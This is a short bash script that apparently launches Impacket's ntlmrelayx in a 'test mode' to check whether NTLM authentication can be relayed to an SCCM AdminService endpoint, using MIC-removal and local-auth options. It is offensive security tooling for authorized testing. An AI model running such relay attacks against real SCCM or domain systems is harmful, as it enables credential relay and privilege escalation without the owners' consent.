#!/bin/bash

# Quick test script for AdminService authentication testing

TARGET="${1:-https://sccm-sitesrv1.domain.local}"

echo "=== Testing AdminService Authentication ==="
echo ""
echo "Target: $TARGET"
echo ""
echo "This will:"
echo "  ✓ Test HTTP->HTTPS local auth bypass"
echo "  ✓ Show if authentication succeeds (200) or fails (401)"
echo "  ✓ NOT perform the actual attack (test mode)"
echo "  ✓ Can be run repeatedly"
echo ""
echo "Starting ntlmrelayx in test mode..."
echo ""

sudo python3 examples/ntlmrelayx.py \
  -t "$TARGET" \
  --adminservice \
  --test-adminservice \
  --remove-mic-partial \
  --try-local \
  -debug

echo ""
echo "Test complete!"
